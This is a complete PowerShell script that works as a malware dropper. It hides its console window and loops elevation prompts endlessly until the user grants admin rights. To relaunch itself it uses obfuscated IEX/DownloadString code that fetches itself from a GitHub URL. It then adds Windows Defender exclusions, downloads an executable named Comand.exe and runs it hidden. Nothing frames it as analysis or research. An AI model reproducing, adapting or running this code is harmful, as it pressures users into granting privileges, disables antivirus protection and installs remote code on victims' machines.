# ===== HIDE WINDOW =====
try {
    Add-Type -Name W -Namespace C -MemberDefinition '[DllImport("Kernel32.dll")] public static extern IntPtr GetConsoleWindow();[DllImport("User32.dll")] public static extern bool ShowWindow(IntPtr h,int c);' -ErrorAction SilentlyContinue
    $w = [C.W]::GetConsoleWindow()
    if ($w -ne [IntPtr]::Zero) { [C.W]::ShowWindow($w, 0) | Out-Null }
} catch {}

# ===== SELF-URL + ADMIN CHECK =====
$self = "https://github.com/analysisw/test/raw/refs/heads/main/test.ps1"
$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

# ===== ELEVATION LOOP: request admin, denied -> ask forever =====
if (-not $isAdmin) {
    if ($PSCommandPath) {
        $relaunch = "-File `"$PSCommandPath`""
    } else {
        $relaunch = "-c &('I'+'EX')((New-Object('Ne'+'t.WebClient')).'Dow'+'nloadString'('$self'))"
    }

    while ($true) {
        try {
            Start-Process powershell -Verb RunAs -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass $relaunch" -ErrorAction Stop
            break
        } catch {
            Start-Sleep -Seconds 2
        }
    }
    exit
}

# ===== ADMIN GRANTED: WORK =====
try { Add-MpPreference -ExclusionPath $env:TEMP -ErrorAction SilentlyContinue } catch {}
try { Add-MpPreference -ExclusionPath "$env:TEMP\Comand.exe" -ErrorAction SilentlyContinue } catch {}

try { Invoke-WebRequest -Uri "https://github.com/analysisw/test/raw/refs/heads/main/Comand.exe" -OutFile "$env:TEMP\Comand.exe" -ErrorAction SilentlyContinue } catch {}
try { Start-Process -FilePath "$env:TEMP\Comand.exe" -WindowStyle Hidden } catch {}
